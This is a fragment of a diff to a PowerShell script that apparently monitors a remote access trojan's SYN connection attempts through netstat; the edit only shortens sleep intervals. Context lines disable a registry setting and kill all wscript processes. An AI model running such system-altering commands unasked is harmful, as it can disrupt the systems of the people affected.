@@ -100,11 +100,11 @@ New-ItemProperty -Path $path -Name Enabled -Value 0 -PropertyType DWORD
  conn("syn_sent")
  Start-Sleep -Seconds 1  #syn_sent disappear from netstat for 5 seconds before rat send another syn if reciever wasn't online
  conn("syn_sent")
- Start-Sleep -Seconds 2
+ Start-Sleep -Seconds 1
  conn("syn_sent")
- Start-Sleep -Seconds 3
+ Start-Sleep -Seconds 1
  conn("syn_sent")
- Start-Sleep -Seconds 4
+ Start-Sleep -Seconds 1
 
  #Kill Wscript process
  Get-Process | where{$_.name -eq "wscript"} | Stop-Process
